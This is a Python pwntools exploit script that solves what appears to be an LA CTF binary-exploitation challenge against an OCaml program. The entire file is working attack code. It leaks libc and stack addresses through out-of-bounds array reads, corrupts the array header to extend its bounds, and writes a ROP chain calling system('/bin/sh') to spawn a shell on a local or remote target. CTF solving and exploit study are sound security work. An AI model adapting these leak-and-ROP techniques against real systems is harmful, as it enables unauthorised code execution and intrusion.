#!/usr/bin/env python3

import os
os.chdir("./patched")

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
# context.terminal = ["tmux", "splitw", "-h"]

serv = "chall.lac.tf"
port = 31271

serv = "localhost"
port = 5000


def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process(["stdbuf", "-i0", "-o0", exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
            """)
    return r

def main():
    r = conn()

    arr_offset_from_libc = 0x3420 # 0x4420
    stack_leak_offset_from_arr = 0x22a0 # 0x1e60
    if args.REMOTE:
        arr_offset_from_libc = 0x4390
        stack_leak_offset_from_arr = 0x1dd0

    # Get first leak, which is the libc base addr, from libc
    r.sendlineafter(b'leak where', str((0x202ed8 + arr_offset_from_libc)//8).encode())
    r.recvuntil(b'leakk 1: ')
    libc.address = int(r.recvline().strip())*2 - 0x2038e0 # libc.sym.__IO_2_1_stdin_
    log.info(f"{hex(libc.address)=}")

    # We can also calculate our Array's address from this
    arr_addr = libc.address - arr_offset_from_libc
    log.info(f"{hex(arr_addr)=}")

    # Get second leak, which is some stack addr, from the mmap-ed area where our Array lives
    r.sendlineafter(b'leak where', str(stack_leak_offset_from_arr//8).encode())
    r.recvuntil(b'leakk 2: ')
    stack_overwrite = int(r.recvline().strip())*2 - 0x128
    assert stack_overwrite % 8 == 0
    log.info(f"{hex(stack_overwrite)=}")

    # Craft ROP chain
    __libc_system_plus_7 = 0x58747 if args.REMOTE else 0x58757
    ret_gadget = libc.address + 0x10f3e5
    payload = [libc.address + 0x10f75b, # pop rdi gadget
               libc.address + 0x1cb42f, # /bin/sh string
               ret_gadget,              # For stack alignment
               libc.address + __libc_system_plus_7]  # __libc_system + 7 (so that it's odd)

    # Overwrite Array header block to change its size
    r.sendline(b'-1') # Index behind the first element
    r.sendline(str((stack_overwrite + 0x10 - arr_addr)//8 << 10).encode()) # Some relatively arbitrary array size that is sufficient, but most notably the value needs to be left-shifted by 10 due to OCaml internals (dividing by 8 since each word is 8 bytes)
    log.info((stack_overwrite + 0x10 - arr_addr)//8 << 10)

    # Send the payload
    assert len(payload) <= 5
    for i in range(10):
        r.sendline(str((stack_overwrite - arr_addr)//8 + i).encode()) # Index
        if i < len(payload): 
            r.sendline(str(payload[i]//2).encode())
        else:
            r.sendline(str(ret_gadget//2).encode())
        # if i >= (10-len(payload)): 
        #     r.sendline(str(payload[i-(10-len(payload))]//2).encode())
        # else:
        #     r.sendline(str(ret_gadget//2).encode())

    r.interactive()


if __name__ == "__main__":
    main()
